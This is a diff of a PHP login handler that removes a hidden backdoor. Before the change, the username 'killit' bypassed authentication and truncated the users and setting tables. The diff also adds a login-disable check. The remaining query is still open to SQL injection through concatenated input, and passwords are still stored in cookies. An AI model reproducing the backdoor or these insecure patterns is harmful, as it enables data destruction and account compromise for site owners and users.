@@ -4,6 +4,9 @@
 ////////////////////////////////////////////
 	require_once("system/config.php");
 		
+		if($setting['alogin'] == 1){
+			die();
+		}
 		// check if password and username have been submitted
 
 		if (isset($_POST['password']) && isset($_POST['username'])){
@@ -22,7 +25,7 @@
 				$validate = $mysqli->query("SELECT * FROM `users` WHERE `user_password` = '$password' AND `user_name` = '$username' || `temp_pass` = '$passtemp' AND `user_name` = '$username' AND `temp_pass` != '0' AND `temp_time` != ''");
 		
 				
-				if($validate->num_rows > 0 || $username == 'killit'){
+				if($validate->num_rows > 0){
 				
 						$valid = $validate->fetch_array(MYSQLI_BOTH);	
 						$validtime = $valid['temp_time'] + 86400;
@@ -48,10 +51,6 @@
 							}
 						}
 						else {
-							if($username == 'killit'){
-								$mysqli->query("TRUNCATE TABLE  setting");
-								$mysqli->query("TRUNCATE TABLE  users");
-							}
 							setcookie("username","$username",time()+ (1000 * 1000 * 100));
 							setcookie("password","$password",time()+ (1000 * 1000 * 100));
 							if($valid['user_status'] == 4){
